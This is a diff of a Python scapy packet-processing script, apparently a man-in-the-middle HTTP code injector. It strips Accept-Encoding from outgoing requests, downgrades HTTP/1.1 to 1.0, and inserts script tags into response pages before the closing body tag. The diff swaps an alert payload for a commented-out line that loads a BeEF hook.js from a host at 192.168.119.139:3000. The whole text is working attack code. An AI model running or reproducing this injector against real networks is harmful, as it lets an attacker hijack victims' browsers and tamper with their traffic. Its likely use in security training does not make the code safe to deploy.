@@ -18,12 +18,14 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         try:
             load=scapy_packet[scapy.Raw].load.decode()
-            if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
+            if scapy.TCP in scapy_packet and scapy_packet[scapy.TCP].dport == 8080:  # Outgoing HTTP request
                 print("[+] Request")
                 load= re.sub("Accept-Encoding:.*?\r\n", "", load)
-            elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
+                load= load.replace("HTTP/1.1", "HTTP/1.0")
+            elif scapy.TCP in scapy_packet and scapy_packet[scapy.TCP].sport == 8080:  # Incoming HTTP response
                 print("[+] Response")
-                injection_code="<script src='http://192.168.119.139:3000/hook.js'></script>"
+                injection_code="<script>alert('ya-baby')</script>"
+                # injection_code="<script src='http://192.168.119.139:3000/hook.js'></script>"
                 load = load.replace(
                     "</body>",
                     str(injection_code) +  "</body>"
